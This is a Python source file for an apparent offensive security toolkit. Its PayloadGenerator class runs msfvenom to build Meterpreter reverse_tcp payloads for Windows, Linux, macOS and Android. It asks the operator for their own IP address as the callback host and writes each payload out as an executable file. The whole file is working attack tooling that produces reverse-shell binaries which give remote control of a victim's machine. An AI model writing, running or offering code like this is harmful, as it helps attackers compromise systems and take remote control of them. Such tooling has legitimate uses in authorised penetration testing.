import random
import subprocess
import logging
from typing import List
from concurrent.futures import ThreadPoolExecutor

from utils import WHITE, RESET

class PayloadGenerator:
    def __init__(self):
        self.tool_paths = {"msfvenom": "msfvenom"}

    def generate_payloads(self, target_ip: str) -> List[str]:
        lhost = input(WHITE + "Enter your IP address (e.g., 192.168.1.100): " + RESET)
        payload_types = {
            "windows": ["windows/meterpreter/reverse_tcp"],
            "linux": ["linux/x64/meterpreter/reverse_tcp"],
            "osx": ["osx/x64/meterpreter_reverse_tcp"],
            "multi": ["multi/handler"],
            "android": ["android/meterpreter/reverse_tcp"]
        }
        files = []
        tasks = []
        with ThreadPoolExecutor(max_workers=5) as executor:
            for os_type, payloads in payload_types.items():
                for payload in payloads:
                    lport = random.randint(4000, 6000)
                    filename = f"payload_{os_type}_{lport}"
                    fmt = "exe" if "windows" in os_type else "elf" if "linux" in os_type else "macho" if "osx" in os_type else "raw"
                    cmd = [self.tool_paths["msfvenom"], "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", filename]
                    tasks.append(executor.submit(subprocess.run, cmd, capture_output=True))
                    files.append(filename)
                    logging.info(f"Payload {filename} generated.")
            for task in tasks:
                task.result()
        return files